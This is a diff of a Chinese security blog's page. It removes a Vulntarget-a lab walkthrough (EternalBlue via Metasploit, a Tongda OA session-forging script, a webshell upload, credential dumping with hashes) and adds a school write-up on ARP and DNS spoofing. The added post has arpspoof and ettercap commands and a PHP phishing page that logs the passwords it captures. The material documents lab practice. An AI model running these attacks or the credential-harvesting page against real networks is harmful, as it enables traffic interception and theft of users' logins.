@@ -17,36 +17,34 @@
   <meta name="author" content="D3n13d">
   <meta name="keywords" content="Web,CTF,渗透测试">
   
-    <meta name="description" content="Vulntarget-a靶场记录外围打点 首页  信息收集1nmap -A -v -sS -T4 192.168.110.129   开启 端口 80 125 135 139 445  由于目标主机是 windows系统且开放445端口，尝试用 ms17010 1nmap --script&#x3D;vuln 192.168.110.129    确认OA系统版本  getshell支线一 msfgetsh">
+    <meta name="description" content="学校作业之前笔记丢了重新搞一哈  arp劫持原理 1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1。 2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02。 3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulntarget-a靶场记录">
-<meta property="og:url" content="https://d3n13d.github.io/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:title" content="arp劫持与dns欺骗">
+<meta property="og:url" content="https://d3n13d.github.io/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/index.html">
 <meta property="og:site_name" content="D3n13d &#39;s blog">
-<meta property="og:description" content="Vulntarget-a靶场记录外围打点 首页  信息收集1nmap -A -v -sS -T4 192.168.110.129   开启 端口 80 125 135 139 445  由于目标主机是 windows系统且开放445端口，尝试用 ms17010 1nmap --script&#x3D;vuln 192.168.110.129    确认OA系统版本  getshell支线一 msfgetsh">
+<meta property="og:description" content="学校作业之前笔记丢了重新搞一哈  arp劫持原理 1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1。 2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02。 3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211030714.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202031963.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202034862.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202036908.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202058983.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211029414.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211032043.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211040131.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211043015.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211108603.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211107378.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211113937.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211122097.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202216507.png">
-<meta property="article:published_time" content="2022-03-21T09:57:16.000Z">
-<meta property="article:modified_time" content="2022-03-21T09:59:46.320Z">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251820533.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251827886.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251829090.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010192.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010072.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252341414.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252251912.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253913.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253600.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252254426.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252256674.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252342383.png">
+<meta property="article:published_time" content="2022-03-25T10:16:03.000Z">
+<meta property="article:modified_time" content="2022-03-25T16:39:23.681Z">
 <meta property="article:author" content="D3n13d">
-<meta property="article:tag" content="内网">
+<meta property="article:tag" content="Web,CTF,渗透测试">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211030714.png">
+<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251820533.png">
   
   
-  <title>Vulntarget-a靶场记录 - D3n13d &#39;s blog</title>
+  <title>arp劫持与dns欺骗 - D3n13d &#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -213,7 +211,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Vulntarget-a靶场记录">
+            <span class="h2" id="subtitle" title="arp劫持与dns欺骗">
               
             </span>
 
@@ -228,8 +226,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-21 17:57" pubdate>
-        2022年3月21日 下午
+      <time datetime="2022-03-25 18:16" pubdate>
+        2022年3月25日 晚上
       </time>
     </span>
   
@@ -277,70 +275,91 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Vulntarget-a靶场记录</h1>
+            <h1 style="display: none">arp劫持与dns欺骗</h1>
             
             <div class="markdown-body">
-              <h1 id="Vulntarget-a靶场记录"><a href="#Vulntarget-a靶场记录" class="headerlink" title="Vulntarget-a靶场记录"></a>Vulntarget-a靶场记录</h1><h2 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211030714.png" srcset="/img/loading.gif" lazyload alt="image-20220321103008393"></p>
-<center>首页</center>
-
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmap -A -v -sS -T4 192.168.110.129<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202031963.png" srcset="/img/loading.gif" lazyload alt="image-20220320203138844"></p>
-<p>开启 端口 80 125 135 139 445 </p>
-<p>由于目标主机是 windows系统且开放445端口，尝试用 ms17010</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap --script=vuln 192.168.110.129<br></code></pre></td></tr></table></figure>
-
-<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202034862.png" srcset="/img/loading.gif" lazyload alt="image-20220320203411718" style="zoom: 80%;" />
-
-<p><strong>确认OA系统版本</strong></p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202036908.png" srcset="/img/loading.gif" lazyload alt="image-20220320203639821"></p>
-<h3 id="getshell支线一"><a href="#getshell支线一" class="headerlink" title="getshell支线一"></a>getshell支线一</h3><blockquote>
-<p>msfgetshell</p>
+              <blockquote>
+<p>学校作业之前笔记丢了重新搞一哈</p>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>search ms17<br>set payload exploit/windows/smb/ms17_010_eternalblue<br>show options<br>set rhost 192.168.110.129<br>exploit<br></code></pre></td></tr></table></figure>
+<h2 id="arp劫持"><a href="#arp劫持" class="headerlink" title="arp劫持"></a>arp劫持</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1。</li>
+<li>2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02。</li>
+<li>3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02。</li>
+</ul>
+<p>ARP欺骗分类</p>
+<ul>
+<li>1.主机欺骗：欺骗对象为主机。</li>
+<li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li>
+</ul>
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">arp-scan -l | awk &#x27;&#123;print $1&#125;&#x27; &gt; result.txt  #主机发现<br>nmap -O -iL result.txt   #确认机器 <br>route -n    #确认网关<br>arpspoof -i eth0 -t 192.168.145.133 -r 192.168.145.2<br>echo 1 &gt;/proc/sys/net/ipv4/ip_forward  #开启端口转发<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202058983.png" srcset="/img/loading.gif" lazyload alt="image-20220320205818816"></p>
-<p>ok，拿到meterpreter</p>
-<h3 id="getshell支线二"><a href="#getshell支线二" class="headerlink" title="getshell支线二"></a>getshell支线二</h3><blockquote>
-<p>文件上传getshell</p>
-</blockquote>
-<h4 id="通达OA-前台任意用户伪造登录"><a href="#通达OA-前台任意用户伪造登录" class="headerlink" title="通达OA 前台任意用户伪造登录"></a>通达OA <strong>前台任意用户伪造登录</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br> <br>headers=&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getV11Session</span>(<span class="hljs-params">url</span>):</span><br>    checkUrl = url+<span class="hljs-string">&#x27;/general/login_code.php&#x27;</span><br>    <span class="hljs-built_in">print</span>(checkUrl)<br>    <span class="hljs-keyword">try</span>:<br>        headers[<span class="hljs-string">&quot;User-Agent&quot;</span>] = <span class="hljs-string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span><br>        getSessUrl = url+<span class="hljs-string">&#x27;/logincheck_code.php&#x27;</span><br>        res = requests.post(<br>            getSessUrl, data=&#123; <span class="hljs-string">&#x27;UID&#x27;</span>: <span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)&#125;,headers=headers)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]Something Wrong With &#x27;</span>+url)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    getV11Session(<span class="hljs-string">&quot;http://192.168.110.129/&quot;</span>)<br>    <br></code></pre></td></tr></table></figure>
+<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251820533.png" srcset="/img/loading.gif" lazyload alt="image-20220325182046394" style="zoom:88%;" />
 
+<center>确认目标机器</center>
 
+<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251827886.png" srcset="/img/loading.gif" lazyload alt="image-20220325182759796"></p>
+<center>展开攻击</center>
 
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211029414.png" srcset="/img/loading.gif" lazyload alt="image-20220321102901251"></p>
-<center>如图将脚本的结果对原登录页面的session进行替换</center>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251829090.png" srcset="/img/loading.gif" lazyload alt="image-20220325182940949"></p>
+<center>受害主机无法联网</center>
 
+<p>这是因为攻击机没有开启端口转发的原因 未开启端口转发直接攻击较被发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo 1 &gt;/proc/sys/net/ipv4/ip_forward  #开启端口转发<br></code></pre></td></tr></table></figure>
 
+<p>之后关闭 arp攻击选项 执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">driftnet</span> -i eth<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211032043.png" srcset="/img/loading.gif" lazyload alt="image-20220321103235853"></p>
-<center>访问/general/index.php进入后台</center>
+<p>为了保证试验成功 进来选取http站点 比如 <a target="_blank" rel="noopener" href="http://www.hnyzzy.com/">http://www.hnyzzy.com/</a></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010192.png" srcset="/img/loading.gif" lazyload alt="image-20220325201006918"></p>
+<center>抓取到的图片</center>
 
-<h4 id="后台文件上传getshell"><a href="#后台文件上传getshell" class="headerlink" title="后台文件上传getshell"></a>后台文件上传getshell</h4><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211040131.png" srcset="/img/loading.gif" lazyload alt="image-20220321104052033"></p>
-<center>找到附件管理组件</center>
-
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211043015.png" srcset="/img/loading.gif" lazyload alt="image-20220321104346921"></p>
-<center>添加存储目录</center>
-
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211108603.png" srcset="/img/loading.gif" lazyload alt="image-20220321110803551"></p>
-<center>找到文件上传入口</center>
-
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211107378.png" srcset="/img/loading.gif" lazyload alt="image-20220321110744263"></p>
-<center>php加.上传文件右侧返回文件名</center>
-
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211113937.png" srcset="/img/loading.gif" lazyload alt="image-20220321111301874"></p>
-<p>成功getshell</p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211122097.png" srcset="/img/loading.gif" lazyload alt="image-20220321112227992"></p>
-<center>上传我们的木马</center>
-
+<p>使用tcpdump检验是否代理</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i eth<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
 
-<h2 id="第二台机器"><a href="#第二台机器" class="headerlink" title="第二台机器"></a>第二台机器</h2><h3 id="抓取用户密码"><a href="#抓取用户密码" class="headerlink" title="抓取用户密码"></a>抓取用户密码</h3><p>接着msf1710得到的shell来看</p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202216507.png" srcset="/img/loading.gif" lazyload alt="image-20220320221653406"></p>
-<p>可以看到已经是 SYSTEM 权限了，尝试去抓一下哈希</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">meterpreter &gt; load kiwi<br>meterpreter &gt; creds_all<br>[+] Running as SYSTEM<br>[*] Retrieving all credentials<br><span class="hljs-section">msv credentials</span><br><span class="hljs-section">===============</span><br><br>Username  Domain   LM                                NTLM                              SHA1<br><span class="hljs-bullet">--------  </span>------   --                                ----                              ----<br>win7      win7-PC  f0d412bd764ffe81aad3b435b51404ee  209c6174da490caeb422f3fa5a7ae634  7c87541fd3f3ef5016e12d411900c87a6046a8e8<br><br><span class="hljs-section">wdigest credentials</span><br><span class="hljs-section">===================</span><br><br>Username  Domain     Password<br><span class="hljs-bullet">--------  </span>------     --------<br>(null)    (null)     (null)<br>WIN7-PC$  WORKGROUP  (null)<br>win7      win7-PC    admin<br><br><span class="hljs-section">tspkg credentials</span><br><span class="hljs-section">=================</span><br><br>Username  Domain   Password<br><span class="hljs-bullet">--------  </span>------   --------<br>win7      win7-PC  admin<br><br><span class="hljs-section">kerberos credentials</span><br><span class="hljs-section">====================</span><br><br>Username  Domain     Password<br><span class="hljs-bullet">--------  </span>------     --------<br>(null)    (null)     (null)<br>win7      win7-PC    admin<br>win7-pc$  WORKGROUP  (null)<br></code></pre></td></tr></table></figure>
 
-<h3 id="跨网段扫描"><a href="#跨网段扫描" class="headerlink" title="跨网段扫描"></a>跨网段扫描</h3>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010072.png" srcset="/img/loading.gif" lazyload alt="image-20220325201040013"></p>
+<p>一点解决方案：</p>
+<ul>
+<li>arp -s 192.168.1.1  00-19-e0-aa-9b-e4  绑定ip和对应mac地址</li>
+</ul>
+<h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​    访问 <code>www.baidu.com</code> ，首先要向本地DNS服务器发出DNS请求，查询 <code>www.baidu.com</code> 的IP地址，如果本地DNS服务器没有在自己的DNS缓存表中发现该网址的记录，就会向根服务器发起查询，根服务器收到请求后，将com域服务器的地址返回给本地DNS服务器，本地DNS服务器则继续向com域发出查询请求，域服务器将 baidu.com 授权域名服务器的地址返回给本地DNS服务器，本地DNS服务器继续向 baidu.com 发起查询，得到 <code>www.baidu.com</code> 的IP本地DNS服务器得到 <code>www.baidu.com</code> 对应的IP地址后以dns应答包的方式传递给用户，并且在本地建立DNS缓存表。<br>Windows下查看和刷清空DNS缓存表的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig /displaydns<br>ipconfig /flushdns<br></code></pre></td></tr></table></figure>
+
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>编辑  ettercap 的dns文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ettercap/etter.dns<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252341414.png" srcset="/img/loading.gif" lazyload alt="image-20220325234118261"></p>
+<p>接着上面的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ettercap -G     #唤醒ettercap<br></code></pre></td></tr></table></figure>
+
+<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252251912.png" srcset="/img/loading.gif" lazyload alt="image-20220325225119837" style="zoom:88%;" />
+
+<center>开始程序</center>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253913.png" srcset="/img/loading.gif" lazyload alt="image-20220325225311836"></p>
+<center>设置选项</center>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253600.png" srcset="/img/loading.gif" lazyload alt="image-20220325225353528"></p>
+<center>使用 arppoisoning攻击模块</center>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252254426.png" srcset="/img/loading.gif" lazyload alt="image-20220325225428367"></p>
+<center>使用远程连接模式</center>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252256674.png" srcset="/img/loading.gif" lazyload alt="image-20220325225631609"></p>
+<center>加载dns_spoof插件</center>
+
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252342383.png" srcset="/img/loading.gif" lazyload alt="image-20220325234259301"></p>
+<center>攻击效果展示</center>
+
+<p>简化版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ettercap -TqM ARP:remote -P dns_spoof /192.168.145.2// /192.168.145.132//<br></code></pre></td></tr></table></figure>
+
+<p>后续利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$passwd</span>)&#123;<br>        header(<span class="hljs-string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script language=\&quot;JavaScript\&quot;&gt;alert(\&quot;密码错误\&quot;);&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-variable">$passwd</span>;<br>        <span class="hljs-variable">$myfile</span> = fopen(<span class="hljs-string">&quot;testfile.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><br>        fwrite(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br>        fclose(<span class="hljs-variable">$myfile</span>);<br>        <br>        <br>        Header(<span class="hljs-string">&quot;Location:http://192.168.145.128/1ndex.html&quot;</span>); <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样可以将截取到的 用户名密码写入 文件然后跳转到正确的页面。然而我这里不知道为什么不能弹窗了…求解 如果你知道答案请留言给我。</p>
+
             </div>
             <hr>
             <div>
@@ -349,22 +368,15 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+                      <a class="hover-with-bg" href="/categories/kali/">kali</a>
                     
                   </div>
                 
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
-                    
-                  </div>
                 
               </div>
               <p class="note note-warning">
                 <strong>本文作者: </strong><a href="/">D3n13d</a> <br>
-                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/">https://d3n13d.github.io/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</a> <br>
+                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/">https://d3n13d.github.io/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/</a> <br>
                 <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                    </p>
                    
@@ -373,18 +385,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">arp劫持与dns欺骗</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/17/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%B5%85%E6%9E%90/">
-                        <span class="hidden-mobile">Nodejs原型链污染浅析</span>
+                      <a href="/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/">
+                        <span class="hidden-mobile">Vulntarget-a靶场记录</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
